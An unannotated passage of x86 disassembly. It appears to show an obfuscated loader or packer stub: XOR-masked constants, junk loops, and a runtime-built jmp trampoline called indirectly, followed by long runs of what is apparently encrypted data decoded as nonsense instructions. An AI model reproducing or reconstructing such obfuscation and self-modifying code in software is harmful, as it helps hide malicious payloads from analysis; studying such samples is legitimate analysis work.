  4154e3:	add    DWORD PTR ds:0x42a835,0x42a7f1
  4154ed:	xor    edx,esi
  4154ef:	xor    DWORD PTR ds:0x42a835,0x571
  4154f9:	xor    ecx,esi
  4154fb:	add    ecx,edx
  4154fd:	mov    edx,DWORD PTR [ebp-0x4]
  415500:	xor    eax,esi
  415502:	or     DWORD PTR ds:0x42a7c5,0x42a805
  41550c:	xor    edx,esi
  41550e:	add    eax,edi
  415510:	lea    ecx,[ecx+edx*1+0x9757c8]
  415517:	mov    DWORD PTR ds:0x42a7f5,0x1d99
  415521:	mov    DWORD PTR [ebp-0x20],eax
  415524:	mov    DWORD PTR ds:0x42a761,0x9d6
  41552e:	cmp    eax,ecx
  415530:	ja     0x415630
  415536:	jmp    0x415589
  41553b:	and    DWORD PTR ds:0x42a7bd,0x0
  415545:	mov    ecx,DWORD PTR ds:0x42a7bd
  41554b:	inc    ecx
  41554c:	mov    DWORD PTR ds:0x42a7bd,ecx
  415552:	cmp    DWORD PTR ds:0x42a7bd,0x21
  415559:	jne    0x415577
  41555f:	push   DWORD PTR [ebp-0x14]
  415562:	push   0x42a845
  415567:	push   0x6e14
  41556c:	push   0x8733
  415571:	call   DWORD PTR ds:0x41d104
  415577:	cmp    DWORD PTR ds:0x42a7bd,0x12
  41557e:	jb     0x415545
  415584:	sbb    eax,ecx
  415586:	mov    eax,DWORD PTR [ebp-0x20]
  415589:	and    DWORD PTR ds:0x42a87d,0x0
  415593:	jmp    0x4155a7
  415598:	xor    ecx,ecx
  41559a:	add    ecx,DWORD PTR ds:0x42a87d
  4155a0:	inc    ecx
  4155a1:	mov    DWORD PTR ds:0x42a87d,ecx
  4155a7:	cmp    DWORD PTR ds:0x42a87d,0x1c
  4155ae:	jae    0x4155d4
  4155b4:	cmp    DWORD PTR ds:0x42a87d,0x21
  4155bb:	jne    0x4155cf
  4155c1:	push   0x6aa9
  4155c6:	push   DWORD PTR [ebp-0x24]
  4155c9:	call   DWORD PTR ds:0x41d108
  4155cf:	jmp    0x415598
  4155d4:	mov    ecx,DWORD PTR [ebp-0x4]
  4155d7:	xor    ecx,esi
  4155d9:	lea    eax,[ecx+eax*1+0x327298]
  4155e0:	push   eax
  4155e1:	mov    eax,DWORD PTR [ebp-0x14]
  4155e4:	xor    eax,esi
  4155e6:	lea    eax,[ebp+eax*1+0x3272a0]
  4155ed:	push   eax
  4155ee:	mov    eax,ds:0x41eae6
  4155f3:	push   DWORD PTR [eax+0x1bc]
  4155f9:	call   0x4043a1
  4155fe:	mov    eax,DWORD PTR [ebp-0x4]
  415601:	mov    ecx,DWORD PTR [ebp-0x20]
  415604:	xor    eax,esi
  415606:	lea    eax,[ecx+eax*1+0x327298]
  41560d:	mov    ecx,DWORD PTR [ebp-0x4]
  415610:	mov    edx,DWORD PTR [ebp-0x4]
  415613:	xor    edx,esi
  415615:	xor    ecx,esi
  415617:	add    ecx,edx
  415619:	mov    edx,DWORD PTR [ebp-0x4]
  41561c:	xor    edx,esi
  41561e:	lea    ecx,[ecx+edx*1+0x9757c8]
  415625:	mov    DWORD PTR [ebp-0x20],eax
  415628:	cmp    eax,ecx
  41562a:	jbe    0x41553b
  415630:	mov    eax,DWORD PTR [ebp+0xc]
  415633:	mov    ds:0x41e96a,eax
  415638:	mov    eax,DWORD PTR [ebp+0x10]
  41563b:	mov    ds:0x41ebbe,eax
  415640:	mov    eax,ds:0x41e96a
  415645:	mov    ecx,DWORD PTR [ebp-0x18]
  415648:	push   DWORD PTR [ebp-0x44]
  41564b:	sub    eax,edi
  41564d:	push   DWORD PTR [ebp-0x30]
  415650:	xor    eax,esi
  415652:	mov    DWORD PTR [ecx],eax
  415654:	push   DWORD PTR [ebp-0x2c]
  415657:	call   0x41594a
  41565c:	sub    eax,edi
  41565e:	xor    eax,esi
  415660:	mov    DWORD PTR [ebp+0xc],eax
  415663:	mov    ecx,DWORD PTR [ebp-0x4]
  415666:	mov    eax,DWORD PTR [ebp+0xc]
  415669:	xor    ecx,esi
  41566b:	add    ecx,edi
  41566d:	xor    edx,edx
  41566f:	div    ecx
  415671:	mov    ecx,DWORD PTR [ebp-0x24]
  415674:	cmp    ecx,eax
  415676:	jne    0x41589f
  41567c:	mov    eax,ds:0x41eae6
  415681:	mov    DWORD PTR [ebp+0x10],eax
  415684:	mov    eax,ds:0x41ebf6
  415689:	mov    DWORD PTR [ebp-0x50],eax
  41568c:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  415693:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  41569a:	mov    DWORD PTR [ebp-0x4c],0xf89cb538
  4156a1:	mov    DWORD PTR [ebp-0x64],0xf89f0538
  4156a8:	mov    DWORD PTR [ebp-0x60],0xf89c85f8
  4156af:	mov    DWORD PTR [ebp-0x54],0xf89c85d8
  4156b6:	mov    eax,DWORD PTR [ebp-0x18]
  4156b9:	xor    eax,esi
  4156bb:	add    eax,edi
  4156bd:	mov    DWORD PTR [ebp-0xc],eax
  4156c0:	mov    DWORD PTR [ebp-0x3c],0xf89c853d
  4156c7:	mov    BYTE PTR [ebp-0x25],0x67
  4156cb:	mov    eax,DWORD PTR [ebp-0x18]
  4156ce:	xor    eax,esi
  4156d0:	add    eax,edi
  4156d2:	mov    DWORD PTR [ebp-0xc],eax
  4156d5:	mov    eax,DWORD PTR [ebp-0x54]
  4156d8:	xor    eax,esi
  4156da:	add    eax,edi
  4156dc:	mov    DWORD PTR [ebp-0x40],eax
  4156df:	mov    eax,DWORD PTR [ebp-0x4c]
  4156e2:	xor    eax,esi
  4156e4:	add    eax,edi
  4156e6:	mov    DWORD PTR [ebp-0x38],eax
  4156e9:	mov    eax,DWORD PTR [ebp-0x3c]
  4156ec:	xor    eax,esi
  4156ee:	add    eax,edi
  4156f0:	mov    DWORD PTR [ebp-0x34],eax
  4156f3:	lea    eax,[ebp-0xa8]
  4156f9:	mov    DWORD PTR [ebp+0xc],eax
  4156fc:	mov    eax,DWORD PTR [ebp-0x18]
  4156ff:	mov    DWORD PTR [ebp-0x14],eax
  415702:	mov    eax,DWORD PTR [ebp-0x20]
  415705:	mov    DWORD PTR [ebp-0x5c],ebx
  415708:	mov    DWORD PTR [ebp-0x10],eax
  41570b:	mov    eax,DWORD PTR [ebp-0x5c]
  41570e:	mov    ecx,DWORD PTR [ebp+0xc]
  415711:	xor    eax,esi
  415713:	add    eax,0x327298
  415718:	mov    DWORD PTR [ecx],eax
  41571a:	mov    eax,DWORD PTR [ebp-0x14]
  41571d:	mov    ecx,DWORD PTR [ebp+0xc]
  415720:	xor    eax,esi
  415722:	add    eax,edi
  415724:	mov    DWORD PTR [ecx+0x4],eax
  415727:	mov    eax,DWORD PTR [ebp-0x34]
  41572a:	mov    ecx,DWORD PTR [ebp+0xc]
  41572d:	mov    DWORD PTR [ecx+0x8],eax
  415730:	mov    eax,DWORD PTR [ebp-0x38]
  415733:	mov    ecx,DWORD PTR [ebp+0xc]
  415736:	mov    DWORD PTR [ecx+0xc],eax
  415739:	mov    eax,DWORD PTR [ebp-0x40]
  41573c:	mov    ecx,DWORD PTR [ebp+0xc]
  41573f:	mov    DWORD PTR [ecx+0x10],eax
  415742:	mov    eax,eax
  415744:	mov    eax,DWORD PTR [ebp-0x10]
  415747:	xor    eax,esi
  415749:	add    eax,edi
  41574b:	je     0x41577c
  415751:	lea    eax,[ebp-0xa8]
  415757:	push   eax
  415758:	mov    eax,DWORD PTR [ebp-0x20]
  41575b:	xor    eax,esi
  41575d:	add    eax,edi
  41575f:	push   eax
  415760:	mov    eax,DWORD PTR [ebp+0x10]
  415763:	add    eax,0xaa
  415768:	push   eax
  415769:	mov    eax,DWORD PTR [ebp+0x10]
  41576c:	mov    eax,DWORD PTR [eax+0x198]
  415772:	push   DWORD PTR [eax]
  415774:	call   0x419198
  415779:	mov    DWORD PTR [ebp-0x8],eax
  41577c:	cmp    DWORD PTR [ebp-0x8],0x0
  415780:	je     0x41589f
  415786:	lea    eax,[ebp-0xc]
  415789:	mov    DWORD PTR [ebp-0x38],eax
  41578c:	mov    eax,DWORD PTR [ebp-0x60]
  41578f:	xor    eax,esi
  415791:	add    eax,edi
  415793:	mov    DWORD PTR [ebp-0x40],eax
  415796:	mov    eax,DWORD PTR [ebp-0x3c]
  415799:	xor    eax,esi
  41579b:	add    eax,edi
  41579d:	mov    DWORD PTR [ebp-0x10],eax
  4157a0:	mov    eax,DWORD PTR [ebp-0x8]
  4157a3:	mov    DWORD PTR [ebp-0x14],eax
  4157a6:	lea    eax,[ebp-0xa8]
  4157ac:	mov    DWORD PTR [ebp+0xc],eax
  4157af:	mov    eax,DWORD PTR [ebp-0x18]
  4157b2:	mov    DWORD PTR [ebp-0x18],eax
  4157b5:	mov    eax,DWORD PTR [ebp-0x20]
  4157b8:	mov    DWORD PTR [ebp-0x48],ebx
  4157bb:	mov    DWORD PTR [ebp-0x34],eax
  4157be:	mov    eax,DWORD PTR [ebp-0x48]
  4157c1:	mov    ecx,DWORD PTR [ebp+0xc]
  4157c4:	xor    eax,esi
  4157c6:	add    eax,0x327298
  4157cb:	mov    DWORD PTR [ecx],eax
  4157cd:	mov    eax,DWORD PTR [ebp-0x14]
  4157d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4157d3:	mov    DWORD PTR [ecx+0x4],eax
  4157d6:	mov    eax,DWORD PTR [ebp-0x10]
  4157d9:	mov    ecx,DWORD PTR [ebp+0xc]
  4157dc:	mov    DWORD PTR [ecx+0x8],eax
  4157df:	mov    eax,DWORD PTR [ebp-0x40]
  4157e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4157e5:	mov    DWORD PTR [ecx+0xc],eax
  4157e8:	mov    eax,DWORD PTR [ebp-0x38]
  4157eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4157ee:	mov    DWORD PTR [ecx+0x10],eax
  4157f1:	mov    eax,eax
  4157f3:	mov    eax,DWORD PTR [ebp-0x14]
  4157f6:	test   eax,eax
  4157f8:	mov    eax,DWORD PTR [ebp-0x34]
  4157fb:	jne    0x415804
  415801:	mov    eax,DWORD PTR [ebp-0x18]
  415804:	xor    eax,esi
  415806:	add    eax,edi
  415808:	test   eax,eax
  41580a:	je     0x415838
  415810:	lea    eax,[ebp-0xa8]
  415816:	push   eax
  415817:	mov    eax,DWORD PTR [ebp-0x20]
  41581a:	xor    eax,esi
  41581c:	add    eax,edi
  41581e:	push   eax
  41581f:	mov    eax,DWORD PTR [ebp+0x10]
  415822:	add    eax,0xee
  415827:	push   eax
  415828:	mov    eax,DWORD PTR [ebp+0x10]
  41582b:	mov    eax,DWORD PTR [eax+0x198]
  415831:	push   DWORD PTR [eax]
  415833:	call   0x419198
  415838:	mov    ecx,DWORD PTR [ebp-0x3c]
  41583b:	xor    ecx,esi
  41583d:	mov    eax,0xffcd8d68
  415842:	sub    eax,ecx
  415844:	sub    eax,DWORD PTR [ebp-0x8]
  415847:	mov    ecx,DWORD PTR [ebp-0x50]
  41584a:	add    ecx,eax
  41584c:	mov    eax,DWORD PTR [ebp-0x8]
  41584f:	mov    DWORD PTR [eax+0x1],ecx
  415852:	mov    al,BYTE PTR [ebp-0x25]
  415855:	mov    ecx,DWORD PTR [ebp-0x8]
  415858:	xor    al,0x43
  41585a:	sub    al,0x3b
  41585c:	mov    BYTE PTR [ecx],al
  41585e:	lea    eax,[ebp-0x8]
  415861:	inc    BYTE PTR [eax]
  415863:	inc    eax
  415864:	push   eax
  415865:	pop    ecx
  415866:	dec    ecx
  415867:	xchg   ecx,edx
  415869:	dec    BYTE PTR [edx]
  41586b:	push   DWORD PTR [ebp+0x10]
  41586e:	mov    eax,ds:0x41eba2
  415873:	mov    eax,DWORD PTR [eax]
  415875:	push   DWORD PTR [eax]
  415877:	lea    eax,ds:0x41ebbe
  41587d:	push   DWORD PTR [eax]
  41587f:	lea    eax,ds:0x41e96a
  415885:	push   DWORD PTR [eax]
  415887:	lea    eax,ds:0x41eb9e
  41588d:	push   DWORD PTR [eax]
  41588f:	lea    eax,ds:0x41ec46
  415895:	push   DWORD PTR [eax]
  415897:	xchg   ebx,edx
  415899:	inc    ebx
  41589a:	push   ebx
  41589b:	pop    eax
  41589c:	call   DWORD PTR [eax-0x1]
  41589f:	lea    eax,[ebp+0x4]
  4158a2:	mov    DWORD PTR [ebp-0x58],eax
  4158a5:	mov    eax,ds:0x41eae6
  4158aa:	push   0x4
  4158ac:	add    eax,0x1cc
  4158b1:	push   eax
  4158b2:	lea    eax,[ebp-0x1c]
  4158b5:	push   eax
  4158b6:	call   0x4043a1
  4158bb:	mov    eax,DWORD PTR [ebp-0x1c]
  4158be:	mov    eax,DWORD PTR [ebp-0x4]
  4158c1:	mov    eax,DWORD PTR [ebp-0x24]
  4158c4:	mov    DWORD PTR [ebp+0xc],eax
  4158c7:	mov    eax,ds:0x41eb6a
  4158cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4158cf:	sub    eax,edi
  4158d1:	xor    eax,esi
  4158d3:	cmp    eax,ecx
  4158d5:	je     0x41591c
  4158db:	mov    eax,ds:0x41eb62
  4158e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4158e3:	sub    eax,edi
  4158e5:	xor    eax,esi
  4158e7:	cmp    eax,ecx
  4158e9:	jne    0x4158ff
  4158ef:	mov    eax,ds:0x41eb6a
  4158f4:	add    eax,DWORD PTR ds:0x41eb62
  4158fa:	jmp    0x415906
  4158ff:	mov    eax,DWORD PTR [ebp+0xc]
  415902:	xor    eax,esi
  415904:	add    eax,edi
  415906:	mov    ds:0x41eb62,eax
  41590b:	mov    eax,DWORD PTR [ebp+0xc]
  41590e:	xor    eax,esi
  415910:	add    eax,edi
  415912:	mov    ds:0x41eb6a,eax
  415917:	jmp    0x415926
  41591c:	mov    eax,ds:0x41eb6a
  415921:	mov    ds:0x41eb62,eax
  415926:	mov    eax,DWORD PTR [ebp-0x58]
  415929:	mov    ecx,DWORD PTR ds:0x41eb62
  41592f:	add    DWORD PTR [eax],ecx
  415931:	push   0x10
  415933:	push   0x41ebfe
  415938:	call   DWORD PTR ds:0x41d114
  41593e:	mov    eax,DWORD PTR [ebp-0x1c]
  415941:	mov    eax,DWORD PTR [eax]
  415943:	pop    edi
  415944:	pop    esi
  415945:	pop    ebx
  415946:	leave  
  415947:	ret    0xc
  41594a:	push   ebp
  41594b:	mov    ebp,esp
  41594d:	jmp    0x415c05
  415952:	into   
  415953:	int    0xc5
  415955:	rol    ebp,1
  415957:	(bad)  
  415959:	shl    eax,1
  41595b:	out    0x8f,al
  41595d:	stc    
  41595e:	cdq    
  41595f:	scas   al,BYTE PTR es:[edi]
  415960:	sar    ah,0x6d
  415963:	adc    BYTE PTR [edi+0x78],bh
  415966:	xchg   ebp,eax
  415967:	jle    0x4159e1
  415969:	js     0x415922
  41596b:	jo     0x4158ff
  41596d:	ror    BYTE PTR es:[esi-0x6a4f262e],cl
  415974:	push   ss
  415975:	and    DWORD PTR [esi],0x5e
  415978:	adc    eax,0x88687e8c
  41597d:	add    BYTE PTR [ecx+esi*8-0x325d4807],dh
  415984:	sbb    eax,0x1a05a784
  415989:	jmp    0x41598f
  41598b:	shl    BYTE PTR [ecx-0x3007f497],0x93
  415992:	test   al,0x29
  415994:	cmc    
  415995:	cmp    eax,0xc8e5810d
  41599a:	addr16 xchg ecx,eax
  41599c:	ficomp DWORD PTR ds:0xb7cd6007
  4159a2:	clc    
  4159a3:	ja     0x4159e1
  4159a5:	(bad)  
  4159a7:	lock mov al,0xe5
  4159aa:	xor    cl,al
  4159ac:	mov    dl,0xd9
  4159ae:	aad    0x76
  4159b0:	adc    cl,ch
  4159b2:	jmp    0x106a:0x4c91074f
  4159b9:	add    eax,0x2b44c4c7
  4159be:	fwait
  4159bf:	push   0x6b
  4159c1:	ret    0x469
  4159c4:	jb     0x415a22
  4159c6:	call   0x4b9b69a9
  4159cb:	in     eax,dx
  4159cc:	adc    esi,DWORD PTR ds:0x5df758e5
  4159d2:	xor    al,0x5e
  4159d4:	jge    0x4159e5
  4159d6:	push   ecx
  4159d7:	jecxz  0x4159c0
  4159d9:	sbb    cl,ah
  4159db:	sahf   
  4159dc:	lds    edi,FWORD PTR [edi]
  4159de:	pop    edi
  4159df:	clc    
  4159e0:	mul    BYTE PTR [ebp-0xdf8a554]
  4159e6:	add    BYTE PTR [ebp+ebx*4+0x6b],al
  4159ea:	adc    bl,al
  4159ec:	add    al,0x66
  4159ee:	mov    DWORD PTR [bx+di-0x17],eax
  4159f2:	imul   eax,edx,0xd
  4159f5:	nop
  4159f6:	adc    eax,0x4ad025ca
  4159fb:	cmp    ebp,DWORD PTR [ebp+0x2]
  4159fe:	pop    esi
  4159ff:	mov    dh,BYTE PTR [edx+0x16777e61]
  415a05:	pop    edx
  415a06:	out    0xed,al
  415a08:	stos   BYTE PTR es:[edi],al
  415a09:	xchg   ebp,eax
  415a0a:	adc    BYTE PTR [ebx-0x5e8caf11],ah
  415a10:	pop    ebp
  415a11:	mov    bh,0x11
  415a13:	out    dx,al
  415a14:	test   BYTE PTR [edi+esi*8+0x2c],ah
  415a18:	cmp    BYTE PTR [edx],bh
  415a1a:	jne    0x415a1b
  415a1c:	cmp    DWORD PTR [esi],edx
  415a1e:	or     BYTE PTR [ebx-0x1a2615a9],bh
  415a24:	(bad)  
  415a25:	je     0x415a47
  415a27:	test   BYTE PTR [ebx],0xe0
  415a2a:	and    al,0x6e
  415a2c:	and    DWORD PTR [ecx],eax
  415a2e:	add    BYTE PTR [ebx-0x715f4f53],bh
  415a34:	sub    eax,0xd7b626fc
  415a39:	add    ebp,edi
  415a3b:	iret   
  415a3c:	nop
  415a3d:	js     0x415a4d
  415a3f:	lods   al,BYTE PTR ds:[esi]
  415a40:	and    eax,DWORD PTR [edi-0x1a86f17e]
  415a46:	pop    ss
  415a47:	sub    BYTE PTR [ecx],bh
  415a49:	mov    al,0xf4
  415a4b:	pop    es
  415a4c:	add    DWORD PTR [edx],ecx
  415a4e:	(bad)
  415a51:	dec    ebx
  415a52:	inc    ecx
  415a53:	ins    BYTE PTR es:[edi],dx
  415a54:	cmp    al,0xd2
  415a56:	xchg   DWORD PTR [eax+ecx*1-0x354cbcaa],ebp
  415a5d:	mov    bl,0x62
  415a5f:	test   eax,0x9a9b2049
  415a64:	cmp    dh,BYTE PTR [ecx+edi*1]
  415a67:	rol    DWORD PTR [edx-0x2],0xcf
  415a6b:	iret   
  415a6c:	ret    0x30a9
  415a6f:	push   ds
  415a70:	sahf   
  415a71:	mov    DWORD PTR ds:0xa8997be4,ebx
  415a77:	shr    BYTE PTR [ebx],1
  415a79:	xchg   ecx,eax
  415a7a:	stos   BYTE PTR es:[edi],al
  415a7b:	loop   0x415a03
  415a7d:	frstor [eax-0x55]
  415a80:	scas   eax,DWORD PTR es:[edi]
  415a81:	(bad)  
  415a82:	clc    
  415a83:	(bad)  
  415a84:	out    dx,eax
  415a85:	ret    0x4323
  415a88:	mov    al,ds:0x12ff0227
  415a8d:	mov    eax,ds:0x25f91376
  415a92:	adc    eax,0x22141e40
  415a97:	in     eax,0xaf
  415a99:	mov    esp,DWORD PTR [ebx+0x36ee07a1]
  415a9f:	mov    BYTE PTR [esi-0x34],bl
  415aa2:	push   edx
  415aa3:	pop    esp
  415aa4:	xor    al,0x63
  415aa6:	dec    eax
  415aa7:	rcl    DWORD PTR ds:0x4e3cc436,cl
  415aad:	jne    0x415a3e
  415aaf:	cmp    DWORD PTR [ecx-0x2709a245],esp
  415ab5:	pusha  
  415ab6:	or     esp,DWORD PTR [esi]
  415ab8:	mov    al,0x5f
  415aba:	sti    
  415abb:	push   cs
  415abc:	call   0x992dc19b
  415ac1:	lahf   
  415ac2:	in     al,0xf6
  415ac4:	stos   BYTE PTR es:[edi],al
  415ac5:	pop    ecx
  415ac6:	cwde   
  415ac7:	test   BYTE PTR [ecx-0x4b],al
  415aca:	leave  
  415acb:	inc    esi
  415acc:	bound  eax,QWORD PTR [esp+ebx*8+0x37]
  415ad0:	cs scas eax,DWORD PTR es:[edi]
  415ad2:	adc    edx,esi
  415ad4:	pushf  
  415ad5:	add    eax,0x5c82c2e6
  415ada:	adc    dh,0xf7
  415add:	je     0x415a7f
  415adf:	shl    ecx,1
  415ae1:	pop    ecx
  415ae2:	inc    ebp
  415ae3:	mov    dh,0xeb
  415ae5:	jo     0x415b21
  415ae7:	int3   
  415ae8:	in     al,0xed
  415aea:	mov    ds:0xcf7e34ed,eax
  415aef:	inc    eax
  415af0:	sahf   
  415af1:	pop    edx
  415af2:	adc    eax,0xd836fc72
  415af7:	shr    BYTE PTR [eax+0x4525c11f],1
  415afd:	sub    al,0xf7
  415aff:	mov    dl,0xc0
  415b01:	scas   al,BYTE PTR es:[edi]
  415b02:	scas   eax,DWORD PTR es:[edi]
  415b03:	bound  ebp,QWORD PTR [edx-0xfa36623]
  415b09:	mov    bl,0x5b
  415b0b:	push   DWORD PTR [ebx]
  415b0d:	xchg   ecx,eax
  415b0e:	mov    ch,0x50
  415b10:	xor    eax,esp
  415b12:	mov    ?,WORD PTR gs:[eax+0x6]
  415b16:	test   al,0x82
  415b18:	dec    ebx
  415b19:	and    ebp,esi
  415b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b1c:	lea    ecx,[esi]
  415b1e:	cli    
  415b1f:	dec    ecx
  415b20:	(bad)  [edx+0x543c20eb]
  415b26:	dec    eax
  415b27:	pop    ecx
  415b28:	mov    eax,ds:0x1fa59444
  415b2d:	std    
  415b2e:	outs   dx,DWORD PTR ds:[esi]
  415b2f:	clc    
  415b30:	xchg   ebx,eax
  415b31:	jecxz  0x415ba0
  415b33:	inc    ecx
  415b34:	and    ah,bl
  415b36:	fucom  st(6)
  415b38:	sbb    esi,DWORD PTR [eax-0x27]
  415b3b:	test   DWORD PTR [esi+0x189fb010],0xe152bf6
  415b45:	push   0x3e3dba72
  415b4a:	cmp    ah,BYTE PTR [edx-0x70]
  415b4d:	iret   
  415b4e:	imul   ebx,ebp,0xba2a2e96
  415b54:	pop    ecx
  415b55:	les    esi,FWORD PTR [ecx-0x2aa67593]
  415b5b:	sti    
  415b5c:	loop   0x415b76
  415b5e:	push   ebx
  415b5f:	dec    ebp
  415b60:	ja     0x415b09
  415b62:	popf   
  415b63:	fisubr WORD PTR [esi+0x68]
  415b66:	ror    BYTE PTR [edi-0x3c],0xf3
  415b6a:	xor    bh,BYTE PTR [edi+0x688abd40]
  415b70:	jle    0x415b0f
  415b72:	mov    ecx,0xb506cabb
  415b77:	sbb    ecx,edi
  415b79:	ret    0xfd46
  415b7c:	in     al,dx
  415b7d:	jmp    0x415bda
  415b7f:	xor    eax,0x4a24af48
  415b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b85:	xchg   esp,eax
  415b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b87:	adc    eax,0xb78a409d
  415b8c:	push   ss
  415b8d:	lock pop edi
  415b8f:	push   ss
  415b90:	and    DWORD PTR [ecx+0x54b54c5c],0x3d
  415b97:	or     eax,ebx
  415b99:	test   al,0xed
  415b9b:	jmp    0x36c4e641
  415ba0:	jns    0x415bd3
  415ba2:	pop    ds
  415ba3:	in     eax,0x0
  415ba5:	bound  esp,QWORD PTR [edx+0x5e]
  415ba8:	jne    0x415bce
  415baa:	xor    DWORD PTR [esi-0x66],esi
  415bad:	mov    esi,0x3117c77b
  415bb2:	or     BYTE PTR [edi],0x14
  415bb5:	(bad)  
  415bb7:	ret    
  415bb8:	inc    esp
  415bb9:	and    BYTE PTR [edx],al
  415bbb:	cmp    DWORD PTR [edx-0x27249fe8],ebx
  415bc1:	sahf   
  415bc2:	sub    esi,DWORD PTR [ecx-0x43fa0881]
  415bc8:	pushf  
  415bc9:	mov    bl,0xb1
  415bcb:	push   ebx
  415bcc:	daa    
  415bcd:	in     al,dx
  415bce:	sbb    bh,BYTE PTR [ebx-0x215f3ce9]
  415bd4:	push   cs
  415bd5:	jo     0x415b7f
  415bd7:	hlt    
  415bd8:	test   edx,ebx
  415bda:	mov    WORD PTR [edx-0x35],gs
  415bdd:	arpl   WORD PTR [eax+0x2e70f216],ax
  415be3:	jp     0x415c09
  415be5:	aas    
  415be6:	mov    eax,0xbf4368b3
  415beb:	imul   edx,DWORD PTR [ebp-0x31b7f459],0x23
  415bf2:	push   0xffffffe0
  415bf4:	pop    es
  415bf5:	sub    DWORD PTR [ebp+ecx*1-0x9],ecx
  415bf9:	out    0xb5,al
  415bfb:	dec    ebp
  415bfc:	xor    eax,DWORD PTR [esi+0x306b4484]
  415c02:	in     eax,dx
  415c03:	dec    edx
  415c04:	rcl    DWORD PTR [ecx+0x51],cl
  415c07:	mov    DWORD PTR ds:0x42a7f5,0x1010
  415c11:	mov    eax,0xf89c8539
  415c16:	mov    DWORD PTR ds:0x42a7b9,0x4c90
  415c20:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  415c27:	mov    DWORD PTR ds:0x42a87d,edx
  415c2d:	push   esi
  415c2e:	jmp    0x415ee6
  415c33:	retf   0xd7d6
  415c36:	xlat   BYTE PTR ds:[ebx]
  415c37:	fcmovnbe st,st(5)
  415c39:	retf   0xa0d9
  415c3c:	test   al,0x64
  415c3e:	pop    ecx
  415c3f:	push   eax
  415c40:	mov    DWORD PTR [ebx-0x4a],esi
  415c43:	mov    dl,BYTE PTR ds:0x7e95787f
  415c49:	js     0x415cc3
  415c4b:	call   DWORD PTR [esi-0x2c]
  415c4e:	mov    bh,0x92
  415c50:	daa    
  415c51:	inc    edx
  415c52:	adc    ch,BYTE PTR [esi+0x20]
  415c55:	jnp    0x415bec
  415c57:	mov    al,0xe7
  415c59:	fist   WORD PTR [edi+0x4]
  415c5c:	mov    ecx,0xe47df223
  415c61:	and    edx,DWORD PTR [esi-0x33e322cf]
  415c67:	dec    edx
  415c68:	arpl   WORD PTR [edx+0x689da57e],dx
  415c6e:	inc    edx
  415c6f:	js     0x415c37
  415c71:	jb     0x415c50
  415c73:	xlat   BYTE PTR ds:[ebx]
  415c74:	mov    eax,0x9e3f755f
  415c79:	pop    edx
  415c7a:	push   ds
  415c7b:	cmp    BYTE PTR [edi-0x5d],0x7b
  415c7f:	jmp    0x415cb4
  415c81:	sahf   
  415c82:	ret    
  415c83:	popf   
  415c84:	jmp    0x62ca0a5d
  415c89:	inc    ecx
  415c8a:	pop    ss
  415c8b:	jbe    0x415caa
  415c8d:	xor    eax,0xb2d817d1
  415c92:	test   eax,0xfafe57b7
  415c97:	xchg   edx,eax
  415c98:	fs cwde 
  415c9a:	cdq    
  415c9b:	or     eax,0xf363813
  415ca0:	fisubr WORD PTR [eax+0x6e439950]
  415ca6:	test   al,0xe2
  415ca8:	cli    
  415ca9:	cmp    al,0xaf
  415cab:	fld    st(4)
  415cad:	cmp    eax,0x8ecab694
  415cb2:	sbb    DWORD PTR [eax-0x675a77c4],ecx
  415cb8:	and    al,0x1a
  415cba:	add    eax,0x9c2a828c
  415cbf:	or     cl,BYTE PTR [edi+0x54]
  415cc2:	and    DWORD PTR [esi-0x18],esp
  415cc5:	xor    bh,BYTE PTR ds:0xf4ae4550
  415ccb:	outs   dx,BYTE PTR ds:[esi]
  415ccc:	jbe    0x415d26
  415cce:	mov    esp,0xea733e67
  415cd3:	sti    
  415cd4:	into   
  415cd5:	jle    0x415cb6
  415cd7:	and    DWORD PTR [ebx],ebx
  415cd9:	shl    BYTE PTR [esi],0x73
  415cdc:	cmp    edx,edx
  415cde:	inc    DWORD PTR [ebx]
  415ce0:	cmp    BYTE PTR [ecx+edi*4-0x5113d908],dh
  415ce7:	mov    ebp,0x856c1793
  415cec:	jo     0x415d45
  415cee:	bound  eax,QWORD PTR [edx-0x4f]
  415cf1:	in     al,0x1d
  415cf3:	shl    BYTE PTR [esi+ebp*1-0x3f4c30e],1
  415cfa:	mov    ds:0x6c1ecf34,al
  415cff:	outs   dx,BYTE PTR ds:[esi]
  415d00:	and    al,BYTE PTR [ebx+edi*8+0xa]
  415d04:	mov    eax,0xb0453cd6
  415d09:	mov    ch,0xc1
  415d0b:	mov    ebx,0x1638d7c8
  415d10:	adc    BYTE PTR [edi],cl
  415d12:	jns    0x415d7f
  415d14:	jo     0x415d74
  415d16:	int3   
  415d17:	in     eax,0x45
  415d19:	lea    esp,[edx]
  415d1b:	xor    bh,BYTE PTR [edi]
  415d1d:	fnstsw WORD PTR [edx-0x41]
  415d20:	clc    
  415d21:	aad    0xbe
  415d23:	loop   0x415d55
  415d25:	cmp    esi,esi
  415d27:	(bad)  
  415d28:	int3   
  415d29:	out    0x6c,eax
  415d2b:	jne    0x415cf8
  415d2d:	sub    al,0xa
  415d2f:	cmp    bl,BYTE PTR [eax-0x76]
  415d32:	dec    edi
  415d33:	fadd   st,st(1)
  415d35:	div    DWORD PTR [ebp+0x78]
  415d38:	pop    edi
  415d39:	clc    
  415d3a:	data16 out dx,al
  415d3c:	or     esp,DWORD PTR [esi+0x3f]
  415d3f:	push   edi
  415d40:	xor    eax,0xdb1b840a
  415d45:	jg     0x415cef
  415d47:	sbb    BYTE PTR [ebx-0x6a],ah
  415d4a:	lock out dx,eax
  415d4c:	cmp    esi,DWORD PTR [edx-0x39]
  415d4f:	lock jp 0x415d48
  415d52:	in     al,0xcb
  415d54:	loope  0x415d7d
  415d56:	out    dx,al
  415d57:	xchg   ebp,eax
  415d58:	pop    ebx
  415d59:	mov    ds,WORD PTR [edx+eax*4]
  415d5c:	retf   
  415d5d:	addr16 cmc 
  415d5f:	adc    al,0xd
  415d61:	push   0xfffffff3
  415d63:	fdiv   DWORD PTR [eax-0x3f]
  415d66:	rcr    edi,cl
  415d68:	xchg   ebx,eax
  415d69:	add    DWORD PTR [eax-0x20f9918b],eax
